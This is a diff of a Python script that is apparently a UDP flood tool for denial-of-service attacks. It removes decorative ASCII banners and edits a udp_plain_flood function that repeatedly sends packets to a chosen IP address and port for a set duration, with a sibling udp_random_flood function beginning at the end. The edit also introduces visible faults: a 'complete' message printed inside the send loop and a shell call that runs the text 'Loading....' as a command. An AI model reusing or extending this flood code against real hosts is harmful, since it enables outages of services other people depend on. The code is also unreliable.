@@ -13,46 +13,6 @@ def clear():
     os.system("cls" if os.name == "nt" else "clear")
     
 time.sleep(3)
-os.system("clear")
-print("""
- ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-  ▒┌──────╮▒▒┌─────╮▒▒╭────╭─╮▒╭─╮▒▒╭─╮▒▒
- ▒▒│ ┌───╮ │▒│ ┌───│─╮│ ╭────╯▒│ │▒▒│ │▒
-  ▒│ │▒▒▒│ │▒│ │▒▒▒╰─╯│ │▒▒│ │▒│ │▒▒│ │▒▒▒
- ▒▒│ └────╯▒▒│ │▒▒▒▒▒▒│ │▒▒│ │▒│ │▒▒│ │▒      ▒▒▒  ▒▒▒  ▒▒▒
-  ▒│ ┌───╯▒▒▒│ │▒▒▒▒▒▒╰────╮ │▒╰────╯ │▒▒    ▒╭─╮▒▒╭─╮▒▒╭─╮▒
-▒▒▒│ │▒▒▒▒▒▒▒└─┘▒▒▒▒▒▒▒▒▒▒▒╰─┘▒▒▒╰──╮ │▒     ▒╰─╯▒▒╰─╯▒▒╰─╯▒
- ▒▒└─┘▒      ▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒┌────╯▒▒     ▒▒▒  ▒▒▒  ▒▒▒
-   ▒▒▒                      ▒▒▒▒▒└──╯▒▒▒▒
-                                 ▒▒▒▒▒""")
-
-
-time.sleep(3)
-os.system("clear")
-print("""
-      ▒▒▒  ▒▒▒▒▒ ▒▒▒▒▒
- ▒████┐▒███┐▒▒████┐▒▒
-▒▒█┌──┘█┌──█┐▒█┌──█┐▒▒
- ▒███┐▒█│▒▒█│▒█│▒▒█│▒▒
-▒▒█┌─┘▒█│▒▒█│▒████┌┘▒▒  ▒▒ ▒▒ ▒▒
- ▒█│▒▒▒▒███┌┘▒█┌─┐█│▒▒  █┐▒█┐▒█┐▒
-▒▒└┘▒▒▒▒└──┘▒└─┘▒└─┘▒▒ ▒└┘▒└┘▒└┘▒
-  ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒""")
-
-time.sleep(3)
-os.system("clear")
-print("""
-       ▒▒▒▒▒▒  ▒▒▒▒    ▒▒▒      ▒▒▒  ▒▒▒▒▒▒▒▒
-▒██████┐▒█┐▒▒▒█┐▒█████┐▒▒▒████┐▒▒██┐▒▒▒█┐▒▒        ▒█┐ 
-▒█┌────┘▒█│▒▒▒█│▒█┌───█┐▒█┌───█┐▒█┌█└┐▒█│▒         ▒█│ 
-▒██████┐▒█│▒▒▒█│▒█│▒▒▒█│▒█│▒▒▒█│▒█│▒█└┐█│▒▒        ▒█│         
-▒└────█│▒█└───█│▒█│▒▒▒█│▒█└████┘▒█│▒▒█└█│▒         ▒█┘
-▒██████│▒▒████┌┘▒█████┌┘▒█┌──┐█│▒█│▒▒▒██│▒▒  ▒█┐▒█┐
-▒└─────┘▒▒└───┘▒▒└────┘▒▒└─┘▒▒└─┘▒└─┘▒▒└─┘▒▒└─┘▒└─┘▒█┐
-▒▒▒▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒▒  ▒▒▒  ▒▒▒ ▒▒▒▒ ▒▒▒▒       ▒└─┘
-""")
-
-time.sleep(3)
 os.system("Loading....")
 
 time.sleep(3)
@@ -79,7 +39,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[37m[Starting UDP Plain flood on] \033[36m{ip}: {port}\033[32mwith {packet_size} ")\033[33m for {duration} duration_seconds...")
+            print(Fore.LIGHTGREEN_EX + f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
@@ -87,6 +47,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     finally:
         sock.close()
         print(Fore.LIGHTGREEN_EX + f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
+                                                                                                                  
 
 def udp_random_flood(ip, port, duration, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
